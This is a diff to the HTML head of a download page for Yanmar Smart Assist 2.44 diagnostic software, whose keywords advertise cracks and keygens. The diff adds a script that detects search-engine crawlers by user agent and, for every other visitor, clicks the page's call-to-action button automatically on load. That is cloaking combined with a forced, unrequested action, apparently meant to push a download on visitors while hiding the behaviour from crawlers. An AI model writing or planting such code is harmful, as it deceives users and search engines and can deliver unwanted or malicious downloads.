@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yanmar Smart Assist 2.44 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Yanmar Smart Assist 2.44 (06.2024) for diagnostic, maintenance, and monitoring of Yanmar engines and equipment. Multi-language support.">
     <meta name="keywords" content="Yanmar Smart Assist, Yanmar engine diagnostics, Yanmar equipment monitoring, Smart Assist 2.44, Yanmar maintenance program, engine fault identification, Yanmar performance optimization, Yanmar Smart Assist features, Smart Assist 2.44 update, Yanmar diagnostics software, equipment condition monitoring, Yanmar engine maintenance, Smart Assist diagnostics tool, Yanmar performance analysis, Smart Assist 2024 version, Yanmar Smart Assist 2.44 06.2024, Yanmar Smart Assist software 2024, Yanmar Smart Assist free download, Yanmar Smart Assist download 2024, Smart Assist diagnostic software, Smart Assist diagnostic software download, Smart Assist diagnostic software free download, Smart Assist diagnostic software crack, Smart Assist diagnostic software keygen, Yanmar Smart Assist download, Yanmar Smart Assist high speed download, Yanmar Smart Assist keygen, Yanmar Smart Assist crack, Yanmar diagnostic software, Yanmar software free download, Yanmar engine diagnostic software free, Yanmar Marine diagnostic software, Yanmar Agricultural diagnostic software, Yanmar Industrial Engine diagnostic software, Yanmar diagnostic software Winrar 222MB, Yanmar diagnostic software English, Yanmar diagnostic software Chinese, Yanmar diagnostic software Japanese, Yanmar diagnostic software Korean, Yanmar diagnostic kit IFBOX, Проверка двигателя Yanmar, Диагностика Yanmar, Программа для диагностики Yanmar, обслуживание Yanmar, Yanmar Smart Assist скачать бесплатно, Yanmar Smart Assist скачать, Yanmar Smart Assist 2.44 скачать, диагностическое программное обеспечение Yanmar, Программа мониторинга Yanmar, Yanmar 免費下載, Yanmar 引擎診斷, Smart Assist 免費下載, 免費診斷軟件, ヤンマーディーゼル診断, Yanmarスマートアシストダウンロード, YanmarSmartAssist 푸리 다운로드, Yanmar진단소프트웨어, 야나마다이아그노스틱스, YanmarSmartAssist된설치">
     <style>
